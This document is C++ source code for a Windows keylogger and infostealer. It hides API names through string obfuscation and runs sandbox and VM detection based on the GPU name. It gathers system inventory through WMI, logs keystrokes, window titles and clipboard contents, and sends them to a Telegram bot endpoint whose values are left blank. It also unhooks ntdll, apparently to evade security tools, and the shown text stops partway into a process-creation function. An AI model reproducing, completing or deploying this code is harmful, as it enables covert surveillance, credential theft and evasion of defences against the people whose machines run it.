#include <windows.h>
#include <winhttp.h>
#include <iostream>
#include <string>
#include <iomanip>
#include <sstream>
#include <Wbemidl.h>
#include <comdef.h>
#include <random>
#pragma comment(lib, "wbemuuid.lib")

typedef FARPROC(WINAPI* GetProcAddressFunc)(HMODULE, LPCSTR);
typedef HMODULE(WINAPI* LoadLibraryFunc)(LPCSTR);

std::string getOriginalString(int offset[], char* big_string, int sizeof_offset) {
    std::string empty_string = "";
    for (int i = 0; i < sizeof_offset / 4; ++i) {
        char character = big_string[offset[i]];
        empty_string += character;
    }
    return empty_string;
}

std::string decode(const char* encoded) {
    std::string decoded;
    size_t len = std::strlen(encoded);
    for (size_t i = 0; i < len; ++i) {
        decoded.push_back(encoded[i] - 1);
    }
    return decoded;
}

char big_string[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ._0123456789\\:";

// communication
int winhttp_library_offset[] = { 22,8,13,7,19,19,15 };
int w_h_o[] = { 48,8,13,33,19,19,15,40,15,4,13 };
int w_h_c[] = { 48,8,13,33,19,19,15,28,14,13,13,4,2,19 };
int w_h_o_r[] = { 48,8,13,33,19,19,15,40,15,4,13,43,4,16,20,4,18,19 };
int w_h_s_r[] = { 48,8,13,33,19,19,15,44,4,13,3,43,4,16,20,4,18,19 };
int w_h_c_h[] = { 48,8,13,33,19,19,15,28,11,14,18,4,33,0,13,3,11,4 };
HMODULE hModule = LoadLibraryA(getOriginalString(winhttp_library_offset, big_string, sizeof(winhttp_library_offset)).c_str());
FARPROC dynWinHttpOpen = GetProcAddress(hModule, getOriginalString(w_h_o, big_string, sizeof(w_h_o)).c_str());
FARPROC dynWinHttpConnect = GetProcAddress(hModule, getOriginalString(w_h_c, big_string, sizeof(w_h_c)).c_str());
FARPROC dynWinHttpOpenRequest = GetProcAddress(hModule, getOriginalString(w_h_o_r, big_string, sizeof(w_h_o_r)).c_str());
FARPROC dynWinHttpSendRequest = GetProcAddress(hModule, getOriginalString(w_h_s_r, big_string, sizeof(w_h_s_r)).c_str());
FARPROC dynWinHttpCloseHandle = GetProcAddress(hModule, getOriginalString(w_h_c_h, big_string, sizeof(w_h_c_h)).c_str());

std::string urlEncode(const std::string& value) {
    std::ostringstream escaped;
    escaped.fill('0');
    escaped << std::hex;

    for (char c : value) {
        if (isalnum(static_cast<unsigned char>(c)) || c == '-' || c == '_' || c == '.' || c == '~') {
            escaped << c;
        }
        else {
            escaped << '%' << std::uppercase << std::setw(2) << int((unsigned char)c) << std::nouppercase;
        }
    }

    return escaped.str();
}

void sendRequest(std::string message)
{
    if (message == "0") return;
	// api.telegram.com endpoint
    std::wstring server;
    for (char c : decode(""))
        server.push_back(c);
    // bot token
    std::wstring token;
    for (char c : decode(""))
        token.push_back(c);

    auto pWinHttpCloseHandle = reinterpret_cast<BOOL(WINAPI*)(HINTERNET)>(dynWinHttpCloseHandle);

    LPCWSTR headers = L"Content-Type: application/x-www-form-urlencoded";
    DWORD headersLength = -1L;

    HINTERNET hSession = reinterpret_cast<HINTERNET(WINAPI*)
        (LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD)>
        (dynWinHttpOpen)
        (L"", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return;

    HINTERNET hConnect = reinterpret_cast<HINTERNET(WINAPI*)
        (HINTERNET, LPCWSTR, INTERNET_PORT, DWORD)>
        (dynWinHttpConnect)
        (hSession, server.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) {
        pWinHttpCloseHandle(hSession);
        return;
    }
    if (message == "0") {
        message = "";
        return;
    }
    for (size_t i = 0; i < message.length(); i += 4000)
    {

        HINTERNET hRequest = reinterpret_cast<HINTERNET(WINAPI*)
            (HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD)>
            (dynWinHttpOpenRequest)
            (hConnect, L"POST", token.c_str(),
                NULL, WINHTTP_NO_REFERER,
                WINHTTP_DEFAULT_ACCEPT_TYPES,
                WINHTTP_FLAG_SECURE);
        if (!hRequest) {
            pWinHttpCloseHandle(hConnect);
            pWinHttpCloseHandle(hSession);
            return;
        }

        std::string chunk = message.substr(i, 4000);
        std::string myMessage = urlEncode(chunk);
        // chatId
        std::string postData = decode("") + myMessage;

        BOOL bResu = reinterpret_cast<BOOL(WINAPI*)
            (HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD)>
            (dynWinHttpSendRequest)
            (hRequest, headers, headersLength,
                (LPVOID)postData.c_str(), (DWORD)postData.length(),
                (DWORD)postData.length(), 0);

        std::cout << bResu << std::endl;
    }
}

// Extractor
int off_ole32[] = { 14, 11, 4, 57, 56, 52, 3, 11, 11 };
int off_CoInitializeEx[] = { 28, 14, 34, 13, 8, 19, 8, 0, 11, 8, 25, 4, 30, 23 }; // "CoInitializeEx"
int off_CoInitializeSecurity[] = { 28, 14, 34, 13, 8, 19, 8, 0, 11, 8, 25, 4, 44, 4, 2, 20, 17, 8, 19, 24 }; // "CoInitializeSecurity"
int off_CoUninitialize[] = { 28, 14, 46, 13, 8, 13, 8, 19, 8, 0, 11, 8, 25, 4 };   // "CoUninitialize"
int off_CoCreateInstance[] = { 28, 14, 28, 17, 4, 0, 19, 4, 34, 13, 18, 19, 0, 13, 2, 4 }; // "CoCreateInstance"
int off_CoSetProxyBlanket[] = { 28, 14, 44, 4, 19, 41, 17, 14, 23, 24, 27, 11, 0, 13, 10, 4, 19 }; // "CoSetProxyBlanket"
int off_rootCimv2[] = { 43, 40, 40, 45, 64, 28, 34, 38, 47, 56 };
HMODULE hOle32 = LoadLibraryA(getOriginalString(off_ole32, big_string, sizeof(off_ole32)).c_str());
FARPROC dynCoInitializeEx = GetProcAddress(hOle32, getOriginalString(off_CoInitializeEx, big_string, sizeof(off_CoInitializeEx)).c_str());
FARPROC dynCoInitializeSecurity = GetProcAddress(hOle32, getOriginalString(off_CoInitializeSecurity, big_string, sizeof(off_CoInitializeSecurity)).c_str());
FARPROC dynCoUninitialize = GetProcAddress(hOle32, getOriginalString(off_CoUninitialize, big_string, sizeof(off_CoUninitialize)).c_str());
FARPROC dynCoCreateInstance = GetProcAddress(hOle32, getOriginalString(off_CoCreateInstance, big_string, sizeof(off_CoCreateInstance)).c_str());
FARPROC dynCoSetProxyBlanket = GetProcAddress(hOle32, getOriginalString(off_CoSetProxyBlanket, big_string, sizeof(off_CoSetProxyBlanket)).c_str());

bool initializeCOM(IWbemLocator** pLoc, IWbemServices** pSvc) {
    HRESULT hres = reinterpret_cast<HRESULT(WINAPI*)(LPVOID, DWORD)>(dynCoInitializeEx)(0, COINIT_MULTITHREADED);
    if (FAILED(hres)) return false;

    hres = reinterpret_cast<HRESULT(WINAPI*)(IUnknown*, LONG, IUnknown*, IUnknown*, DWORD, DWORD, IUnknown*, DWORD, IUnknown*)>(dynCoInitializeSecurity)(
        nullptr, -1, nullptr, nullptr,
        RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE,
        nullptr, EOAC_NONE, nullptr);
    if (FAILED(hres)) {
        reinterpret_cast<void(WINAPI*)()>(dynCoUninitialize)();
        return false;
    }

    hres = reinterpret_cast<HRESULT(WINAPI*)(REFCLSID, LPUNKNOWN, DWORD, REFIID, LPVOID*)>(dynCoCreateInstance)(
        CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER,
        IID_IWbemLocator, reinterpret_cast<LPVOID*>(pLoc));
    if (FAILED(hres)) {
        reinterpret_cast<void(WINAPI*)()>(dynCoUninitialize)();
        return false;
    }

    hres = (*pLoc)->ConnectServer(
        _bstr_t(getOriginalString(off_rootCimv2, big_string, sizeof(off_rootCimv2)).c_str()),
        nullptr, nullptr, 0, NULL, 0, 0, pSvc
    );
    if (FAILED(hres)) {
        (*pLoc)->Release();
        reinterpret_cast<void(WINAPI*)()>(dynCoUninitialize)();
        return false;
    }

    hres = reinterpret_cast<HRESULT(WINAPI*)(IUnknown*, DWORD, DWORD, LPWSTR, DWORD, DWORD, IUnknown*, DWORD)>(dynCoSetProxyBlanket)(
        *pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, nullptr,
        RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE,
        nullptr, EOAC_NONE);
    if (FAILED(hres)) {
        (*pSvc)->Release();
        (*pLoc)->Release();
        reinterpret_cast<void(WINAPI*)()>(dynCoUninitialize)();
        return false;
    }

    return true;
}

std::string queryWMI(IWbemServices* pSvc, const char* query, const char* propertyName, const char* sectionName) {
    std::stringstream ss;
    ss << "\n=== " << sectionName << " Information ===\n";

    IEnumWbemClassObject* pEnumerator = nullptr;
    HRESULT hres = pSvc->ExecQuery(bstr_t("WQL"), bstr_t(query),
        WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
        nullptr, &pEnumerator);

    if (FAILED(hres)) {
        return std::string(sectionName) + " query failed\n";
    }

    IWbemClassObject* pclsObj = nullptr;
    ULONG uReturn = 0;
    while (pEnumerator && SUCCEEDED(pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn)) && uReturn) {
        VARIANT vtProp;
        VariantInit(&vtProp);
        if (SUCCEEDED(pclsObj->Get(_bstr_t(propertyName), 0, &vtProp, 0, 0)) && vtProp.vt == VT_BSTR) {
            ss << _bstr_t(vtProp.bstrVal) << "\n";
        }
        VariantClear(&vtProp);
        pclsObj->Release();
    }

    if (pEnumerator) pEnumerator->Release();
    return ss.str();
}

std::string getWindowsVersion(IWbemServices* pSvc) {

    return queryWMI(pSvc, decode("TFMFDU!+!GSPN!Xjo43`PqfsbujohTztufn").c_str(), "Caption", "OS")
        + queryWMI(pSvc, decode("TFMFDU!+!GSPN!Xjo43`PqfsbujohTztufn").c_str(), "Version", "Version")
        + queryWMI(pSvc, decode("TFMFDU!+!GSPN!Xjo43`PqfsbujohTztufn").c_str(), "BuildNumber", "Build Number");
}

std::string getTotalRAM(IWbemServices* pSvc) {
    std::stringstream ss;
    IEnumWbemClassObject* pEnumerator = nullptr;
    HRESULT hres = pSvc->ExecQuery(bstr_t("WQL"), bstr_t(decode("TFMFDU!+!GSPN!Xjo43`DpnqvufsTztufn").c_str()),
        WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
        nullptr, &pEnumerator);

    if (FAILED(hres)) return "Query for RAM failed\n";

    ss << "\n=== RAM Information ===\n";
    IWbemClassObject* pclsObj = nullptr;
    ULONG uReturn = 0;
    while (pEnumerator && SUCCEEDED(pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn)) && uReturn) {
        VARIANT vtProp;
        VariantInit(&vtProp);
        if (SUCCEEDED(pclsObj->Get(L"TotalPhysicalMemory", 0, &vtProp, 0, 0)) && vtProp.vt == VT_BSTR) {
            double totalGB = _wtof(vtProp.bstrVal) / (1024.0 * 1024.0 * 1024.0);
            ss << std::fixed << std::setprecision(2) << "Total RAM: " << totalGB << " GB\n";
        }
        VariantClear(&vtProp);
        pclsObj->Release();
    }
    if (pEnumerator) pEnumerator->Release();
    return ss.str();
}

std::string getDiskInfo(IWbemServices* pSvc) {
    std::stringstream ss;
    ss << "\n=== Disk ===\n";

    IEnumWbemClassObject* pEnumerator = nullptr;
    HRESULT hres = pSvc->ExecQuery(bstr_t("WQL"), bstr_t(decode("TFMFDU!+!GSPN!Xjo43`EjtlEsjwf").c_str()),
        WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
        nullptr, &pEnumerator);

    if (FAILED(hres)) return "Query for disk failed\n";

    IWbemClassObject* pclsObj = nullptr;
    ULONG uReturn = 0;
    while (pEnumerator && SUCCEEDED(pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn)) && uReturn) {
        VARIANT vtModel, vtSize;
        VariantInit(&vtModel); VariantInit(&vtSize);
        pclsObj->Get(L"Model", 0, &vtModel, 0, 0);
        pclsObj->Get(L"Size", 0, &vtSize, 0, 0);

        if (vtModel.vt == VT_BSTR) ss << _bstr_t(vtModel.bstrVal);
        if (vtSize.vt == VT_BSTR) {
            double sizeGB = _wtof(vtSize.bstrVal) / (1024.0 * 1024.0 * 1024.0);
            ss << std::fixed << std::setprecision(2) << " - Size: " << sizeGB << " GB\n";
        }
        VariantClear(&vtModel); VariantClear(&vtSize);
        pclsObj->Release();
    }
    if (pEnumerator) pEnumerator->Release();
    return ss.str();
}

std::string collectSystemInfo() {
    std::stringstream ss;
    IWbemLocator* pLoc = nullptr;
    IWbemServices* pSvc = nullptr;

    if (!initializeCOM(&pLoc, &pSvc)) return "Failed to initialize \n";

    std::string gpu = queryWMI(pSvc, decode("TFMFDU!+!GSPN!Xjo43`WjefpDpouspmmfs").c_str(), "Name", "Graphics Card");
    std::transform(gpu.begin(), gpu.end(), gpu.begin(), ::tolower);

    if (
        (gpu.find(decode("owjejb")) == std::string::npos &&
            gpu.find(decode("bne")) == std::string::npos &&
            gpu.find(decode("sbefpo")) == std::string::npos &&
            gpu.find(decode("joufm")) == std::string::npos &&
            gpu.find(decode("hfgpsdf")) == std::string::npos &&
            gpu.find(decode("jsjt")) == std::string::npos)
        ||
        (
            gpu.find(decode("wjsuvbmcpy")) != std::string::npos ||
            gpu.find(decode("wnxbsf")) != std::string::npos ||
            gpu.find(decode("izqfs.w")) != std::string::npos ||
            gpu.find(decode("qbsbmmfmt")) != std::string::npos ||
            gpu.find(decode("rfnv")) != std::string::npos ||
            gpu.find(decode("lwn")) != std::string::npos ||
            gpu.find(decode("yfo")) != std::string::npos ||
            gpu.find(decode("tuboebse")) != std::string::npos)
        )return "0";



    ss << "\n================= Target Information =================\n\n";
    ss << getWindowsVersion(pSvc);
    ss << queryWMI(pSvc, decode("TFMFDU!+!GSPN!Xjo43`Qspdfttps").c_str(), "Name", "CPU");
    ss << getTotalRAM(pSvc);
    ss << getDiskInfo(pSvc);
    ss << gpu;
    ss << queryWMI(pSvc, decode("TFMFDU!+!GSPN!Xjo43`OfuxpslBebqufs!XIFSF!QiztjdbmBebqufs!>!Usvf").c_str(), "Name", "Network Adapter");
    ss << queryWMI(pSvc, decode("TFMFDU!+!GSPN!Xjo43`CbtfCpbse").c_str(), "Product", "Motherboard");
    ss << queryWMI(pSvc, decode("TFMFDU!+!GSPN!Xjo43`RvjdlGjyFohjoffsjoh").c_str(), "HotFixID", "Security Update");
    ss << queryWMI(pSvc, decode("TFMFDU!+!GSPN!Xjo43`VTCDpouspmmfs").c_str(), "Name", "USB Controller");
    ss << queryWMI(pSvc, decode("TFMFDU!+!GSPN!Xjo43`VTCIvc").c_str(), "Description", "USB Hub");
    ss << queryWMI(pSvc, decode("TFMFDU!+!GSPN!Xjo43`Qsjoufs!XIFSF!Mpdbm!>!Usvf").c_str(), "Name", "Printer");
    ss << queryWMI(pSvc, decode("TFMFDU!+!GSPN!Xjo43`QoQFoujuz!XIFSF!Qsftfou!>!Usvf!BOE!)QOQDmbtt!>!(Npvtf(!PS!QOQDmbtt!>!(Lfzcpbse(!PS!QOQDmbtt!>!(BvejpFoeqpjou(!PS!QOQDmbtt!>!(Dbnfsb(!PS!QOQDmbtt!>!(Qsjoufs(!PS!QOQDmbtt!>!(Nfejb(*").c_str(), "Name", "PnP Devices");

    if (pSvc) pSvc->Release();
    if (pLoc) pLoc->Release();
    reinterpret_cast<void(WINAPI*)()>(dynCoUninitialize)();

    return ss.str();
}

// Keylogger
int kernel32_lib_offset[] = { 36,4,17,13,4,11,57,56 };
int user32_lib_offset[] = { 20,18,4,17,57,56,52,3,11,11 };
int dynGetForegroundWindow_offset[] = { 32,4,19,31,14,17,4,6,17,14,20,13,3,48,8,13,3,14,22 };
int dynGetWindowTextW_offset[] = { 32,4,19,48,8,13,3,14,22,45,4,23,19,48 };
int dynGetKeyboardState_offset[] = { 32,4,19,36,4,24,1,14,0,17,3,44,19,0,19,4 };
int dynGetAsyncKeyState_offset[] = { 32,4,19,26,18,24,13,2,36,4,24,44,19,0,19,4 };
int dynGetKeyState_offset[] = { 32,4,19,36,4,24,44,19,0,19,4 };
int dynToUnicodeEx_offset[] = { 45,14,46,13,8,2,14,3,4,30,23 };
int dynGetKeyboardLayout_offset[] = { 32,4,19,36,4,24,1,14,0,17,3,37,0,24,14,20,19 };
int dynOpenClipboard_offset[] = { 40,15,4,13,28,11,8,15,1,14,0,17,3 };
int dynGetClipboardData_offset[] = { 32,4,19,28,11,8,15,1,14,0,17,3,29,0,19,0 };
int dynCloseClipboard_offset[] = { 28,11,14,18,4,28,11,8,15,1,14,0,17,3 };
int dynSleep_offset[] = { 44,11,4,4,15 };
HMODULE user32Module = LoadLibraryA(getOriginalString(user32_lib_offset, big_string, sizeof(user32_lib_offset)).c_str());
HMODULE hmodule_kernel32 = LoadLibraryA(getOriginalString(kernel32_lib_offset, big_string, sizeof(kernel32_lib_offset)).c_str());
FARPROC dynSleep = GetProcAddress(hmodule_kernel32, getOriginalString(dynSleep_offset, big_string, sizeof(dynSleep_offset)).c_str());
FARPROC dynGetForegroundWindow = GetProcAddress(user32Module, getOriginalString(dynGetForegroundWindow_offset, big_string, sizeof(dynGetForegroundWindow_offset)).c_str());
FARPROC dynGetWindowTextW = GetProcAddress(user32Module, getOriginalString(dynGetWindowTextW_offset, big_string, sizeof(dynGetWindowTextW_offset)).c_str());
FARPROC dynGetKeyboardState = GetProcAddress(user32Module, getOriginalString(dynGetKeyboardState_offset, big_string, sizeof(dynGetKeyboardState_offset)).c_str());
FARPROC dynGetAsyncKeyState = GetProcAddress(user32Module, getOriginalString(dynGetAsyncKeyState_offset, big_string, sizeof(dynGetAsyncKeyState_offset)).c_str());
FARPROC dynGetKeyState = GetProcAddress(user32Module, getOriginalString(dynGetKeyState_offset, big_string, sizeof(dynGetKeyState_offset)).c_str());
FARPROC dynToUnicodeEx = GetProcAddress(user32Module, getOriginalString(dynToUnicodeEx_offset, big_string, sizeof(dynToUnicodeEx_offset)).c_str());
FARPROC dynGetKeyboardLayout = GetProcAddress(user32Module, getOriginalString(dynGetKeyboardLayout_offset, big_string, sizeof(dynGetKeyboardLayout_offset)).c_str());
FARPROC dynOpenClipboard = GetProcAddress(user32Module, getOriginalString(dynOpenClipboard_offset, big_string, sizeof(dynOpenClipboard_offset)).c_str());
FARPROC dynGetClipboardData = GetProcAddress(user32Module, getOriginalString(dynGetClipboardData_offset, big_string, sizeof(dynGetClipboardData_offset)).c_str());
FARPROC dynCloseClipboard = GetProcAddress(user32Module, getOriginalString(dynCloseClipboard_offset, big_string, sizeof(dynCloseClipboard_offset)).c_str());

void logActiveWindow(std::stringstream& to_send)
{
    wchar_t windowTitle[256];

    HWND hwnd = reinterpret_cast<HWND(*)(void)>(dynGetForegroundWindow)();
    if (hwnd != NULL) {
        int titleLength = reinterpret_cast<int(*)(HWND, LPWSTR, int)>
            (dynGetWindowTextW)(hwnd, windowTitle, sizeof(windowTitle) / sizeof(wchar_t));
        if (titleLength > 0) {
            char buffer[512];
            int result = WideCharToMultiByte(CP_UTF8, 0, windowTitle, -1, buffer, sizeof(buffer), NULL, NULL);
            if (result > 0) {
                to_send << "\n[Active Window: " << buffer << "]\n";
            }
        }
    }
}

void logClipboard(std::stringstream& to_send)
{
    // Open the clipboard
    if (reinterpret_cast<BOOL(*)(HWND)>(dynOpenClipboard)(NULL)) {

        HANDLE hData = reinterpret_cast<HANDLE(*)(UINT)>(dynGetClipboardData)(CF_TEXT); // Get clipboard data in text format
        if (hData != NULL) {
            char* clipboardText = static_cast<char*>(GlobalLock(hData)); // Lock the data
            if (clipboardText != NULL) {
                to_send << "[Clipboard]\n" << clipboardText << "\n"; // Log the clipboard text
                GlobalUnlock(hData); // Unlock the data
            }
        }
        reinterpret_cast<BOOL(*)()>(dynCloseClipboard)(); // Close the clipboard
    }
}

void logKey(int key, std::stringstream& to_send)
{
    BYTE keyboardState[256] = { 0 };

    if (!reinterpret_cast<BOOL(*)(BYTE*)>(dynGetKeyboardState)(keyboardState)) {
        to_send << "[ERROR: Get Keyboard State failed]";
        return;
    }

    if (reinterpret_cast<short(*)(int)>
        (dynGetAsyncKeyState)(VK_SHIFT) & 0x8000) keyboardState[VK_SHIFT] |= 0x80;

    if (reinterpret_cast<short(*)(int)>(dynGetKeyState)(VK_CAPITAL) & 0x0001) keyboardState[VK_CAPITAL] |= 0x01;


    if (key == VK_BACK) to_send << "[BACKSPACE]";
    else if (key == VK_RETURN) to_send << "\n";
    else if (key == VK_SPACE) to_send << " ";
    else if (key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT) to_send << "[SHIFT]";
    else if (key == VK_TAB) to_send << "[TAB]";
    else if (key == VK_ESCAPE) to_send << "[ESC]";
    else if (key == VK_CONTROL) to_send << "[CTRL]";
    else if (key == VK_MENU) to_send << "[ALT]";
    else if (key == VK_LEFT) to_send << "[LEFT]";
    else if (key == VK_RIGHT) to_send << "[RIGHT]";
    else if (key == VK_UP) to_send << "[UP]";
    else if (key == VK_DOWN) to_send << "[DOWN]";
    else if (key >= VK_F1 && key <= VK_F12) to_send << "[F" << key - VK_F1 + 1 << "]";
    else if (key == 'C' && (reinterpret_cast<short(*)(int)>(dynGetAsyncKeyState)(VK_CONTROL) & 0x8000)) {
        to_send << "[CTRL+C] ";
        logClipboard(to_send);
    }
    else if (key == 'V' && (reinterpret_cast<short(*)(int)>(dynGetAsyncKeyState)(VK_CONTROL) & 0x8000)) {
        to_send << "[CTRL+V] ";
        logClipboard(to_send);
    }
    else if (key == 'X' && (reinterpret_cast<short(*)(int)>(dynGetAsyncKeyState)(VK_CONTROL) & 0x8000)) {
        to_send << "[CTRL+X] ";
        logClipboard(to_send);
    }
    else {
        WCHAR unicodeChar[5] = { 0 };
        UINT scanCode = MapVirtualKey(key, MAPVK_VK_TO_VSC);
        HKL layout = reinterpret_cast<HKL(*)(DWORD)>(dynGetKeyboardLayout)(0);

        int result = reinterpret_cast<int(*)(UINT, UINT, BYTE*, LPWSTR, int, UINT, HKL)>
            (dynToUnicodeEx)(key, scanCode, keyboardState, unicodeChar, 4, 0, layout);
        if (result > 0) {
            char buffer[8];
            size_t convertedChars = 0;
            errno_t err = wcstombs_s(&convertedChars, buffer, sizeof(buffer), unicodeChar, _TRUNCATE);
            if (err == 0) {
                to_send << buffer;
            }
            else {
                to_send << "[ERROR: Conversion failed]";
            }
        }
    }
}

void captureKeystrokesAndClipboard(std::string& message) {
    if (message == "0") return;
    std::stringstream to_send;
    std::wstring lastWindow = L""; // Track changes in the active window using wstring
    std::string lastClipboard;    // Track the last clipboard content
    std::string clipboardText;    // Track the current clipboard content

    // Open the clipboard and log its content
    if (reinterpret_cast<BOOL(*)(HWND)>(dynOpenClipboard)(NULL)) {
        HANDLE hData = reinterpret_cast<HANDLE(*)(UINT)>(dynGetClipboardData)(CF_TEXT); // Get clipboard data in text format
        if (hData != NULL) {
            char* clipboardData = static_cast<char*>(GlobalLock(hData)); // Lock the data
            if (clipboardData != NULL) {
                lastClipboard = clipboardData; // Store clipboard content in std::string
                to_send << "[Clipboard]\n" << lastClipboard << "\n"; // Log the clipboard text
                GlobalUnlock(hData); // Unlock the data
            }
        }
        reinterpret_cast<BOOL(*)()>(dynCloseClipboard)(); // Close the clipboard
    }

    if (message == "0") {
        message = "";
        return;
    }

    // Random number generator setup
    std::random_device rd; // Seed for random number generator
    std::mt19937 gen(rd()); // Mersenne Twister random number generator
    std::uniform_int_distribution<> dist(300, 400); // Range: 3000 to 4000
    int randomDelay = dist(gen); // Generate a random delay
    static int counter = 0;

    while (true) {
        HWND hwnd = reinterpret_cast<HWND(*)(void)>(dynGetForegroundWindow)(); // Get handle to the current window
        wchar_t windowTitle[256];
        reinterpret_cast<int(*)(HWND, LPWSTR, int)>(dynGetWindowTextW)
            (hwnd, windowTitle, sizeof(windowTitle) / sizeof(wchar_t));

        // Log window title if it has changed
        if (lastWindow != windowTitle) {
            lastWindow = windowTitle;
            logActiveWindow(to_send); // Log the new active window
        }

        // Capture and log keystrokes
        for (int key = 8; key <= 190; key++) {
            if (reinterpret_cast<short(*)(int)>(dynGetAsyncKeyState)(key) == -32767) {
                logKey(key, to_send);
            }
        }

        if (reinterpret_cast<BOOL(*)(HWND)>(dynOpenClipboard)(NULL)) {
            HANDLE hData = reinterpret_cast<HANDLE(*)(UINT)>(dynGetClipboardData)(CF_TEXT); // Get clipboard data in text format
            if (hData != NULL) {
                char* clipboardData = static_cast<char*>(GlobalLock(hData)); // Lock the data
                if (clipboardData != NULL) {
                    clipboardText = clipboardData; // Store clipboard content in std::string
                    if (clipboardText != lastClipboard) { // Check if clipboard content has changed
                        to_send << "[Clipboard]\n" << clipboardText << "\n"; // Log the clipboard text
                        lastClipboard = clipboardText; // Update lastClipboard
                    }
                    GlobalUnlock(hData); // Unlock the data
                }
            }
            reinterpret_cast<BOOL(*)()>(dynCloseClipboard)(); // Close the clipboard
        }

        reinterpret_cast<void(*)(DWORD)>(dynSleep)(100); // Correct: Sleep returns void

        counter++;
        if (counter >= randomDelay) {
            if (to_send.str().size() == 0) {

                continue;
            }

            sendRequest(to_send.str()); // Send the content to the server

            to_send.str(""); // Clear the string stream

            counter = 0; // Reset counter
            randomDelay = dist(gen); // Generate a random delay
        }
    }
}

//dynamic
BYTE pat1[3];
BYTE pat2[3];
BYTE pat3[9];
int nt[] = { 39,19,3,11,11 };
int kr[] = { 36,4,17,13,4,11,57,56 };
int vp[] = { 47,8,17,19,20,0,11,41,17,14,19,4,2,19 };
typedef BOOL(WINAPI* VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
HMODULE modKr = LoadLibraryA((LPCSTR)getOriginalString(kr, big_string, sizeof(kr)).c_str());

void genps() {

    pat1[0] = big_string[0] ^ big_string[13];
    pat1[1] = big_string[7] - big_string[2];
    pat1[2] = big_string[28] | 0x80;

    const BYTE cc = (big_string[37] << 1) + big_string[58];
    pat2[0] = pat2[1] = pat2[2] = cc;

    pat3[0] = pat1[0];
    pat3[1] = pat1[1];
    pat3[2] = pat1[2];
    pat3[3] = big_string[38] | 0x80;
    pat3[4] = big_string[52];
    pat3[5] = pat1[2];
    pat3[6] = pat3[7] = pat3[8] = cc;

}

int first(char* pm, DWORD size) {
    DWORD i = 0;
    DWORD in = 0;

    for (i = 0; i < size - 3; i++) {
        if (!memcmp(pm + i, pat1, 3)) {
            in = i;
            break;
        }
    }

    for (i = 3; i < 50; i++) {
        if (!memcmp(pm + in - i, pat2, 3)) {
            in = in - i + 3;
            break;
        }
    }

    return in;
}

int last(char* pm, DWORD size) {
    DWORD i;
    DWORD in = 0;

    for (i = size - 9; i > 0; i--) {
        if (!memcmp(pm + i, pat3, 9)) {
            in = i + 6;
            break;
        }
    }

    return in;
}

static int core(const HMODULE h1, const LPVOID pca) {
    int txt[] = { 52,19,4,23,19 };
    DWORD old = 0;
    PIMAGE_DOS_HEADER pImgDOSHead = (PIMAGE_DOS_HEADER)pca;
    PIMAGE_NT_HEADERS pImgNTHead = (PIMAGE_NT_HEADERS)((DWORD_PTR)pca + pImgDOSHead->e_lfanew);
    int i;
    genps();

    FARPROC dynVP = GetProcAddress(modKr, (LPCSTR)getOriginalString(vp, big_string, sizeof(vp)).c_str());

    VirtualProtect_t VPro = reinterpret_cast<VirtualProtect_t>(dynVP);


    for (i = 0; i < pImgNTHead->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER pish = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pImgNTHead) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

        if (!strcmp((char*)pish->Name, getOriginalString(txt, big_string, sizeof(txt)).c_str())) {
            VPro((LPVOID)((DWORD_PTR)h1 + (DWORD_PTR)pish->VirtualAddress),
                pish->Misc.VirtualSize,
                PAGE_EXECUTE_READWRITE,
                &old);
            if (!old) {
                return -1;
            }

            DWORD SC_start = first((char*)pca, pish->Misc.VirtualSize);
            DWORD SC_end = last((char*)pca, pish->Misc.VirtualSize);

            if (SC_start != 0 && SC_end != 0 && SC_start < SC_end) {
                DWORD SC_size = SC_end - SC_start;
                memcpy((LPVOID)((DWORD_PTR)h1 + SC_start),
                    (LPVOID)((DWORD_PTR)pca + +SC_start),
                    SC_size);
            }

            VPro((LPVOID)((DWORD_PTR)h1 + (DWORD_PTR)pish->VirtualAddress),
                pish->Misc.VirtualSize,
                old,
                &old);
            if (!old) {
                return -1;
            }
            return 0;
        }
    }

    return -1;
}

void firstfun() {
    int calc[] = { 2,0,11,2,52,4,23,4 };
    int path[] = { 28,65,64,48,8,13,3,14,22,18,64,44,24,18,19,4,12,57,56,64 };
    int nd[] = { 13,19,3,11,11,52,3,11,11 };
    int create[] = { 28,17,4,0,19,4,41,17,14,2,4,18,18,26 };
    int va[] = { 47,8,17,19,20,0,11,26,11,11,14,2 };
    int end[] = { 45,4,17,12,8,13,0,19,4,41,17,14,2,4,18,18 };
    int free[] = { 47,8,17,19,20,0,11,31,17,4,4 };
    int gm[] = { 32,4,19,38,14,3,20,11,4,33,0,13,3,11,4,26 };


    int ret = 0;

    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    FARPROC fcp = GetProcAddress(modKr, getOriginalString(create, big_string, sizeof(create)).c_str());


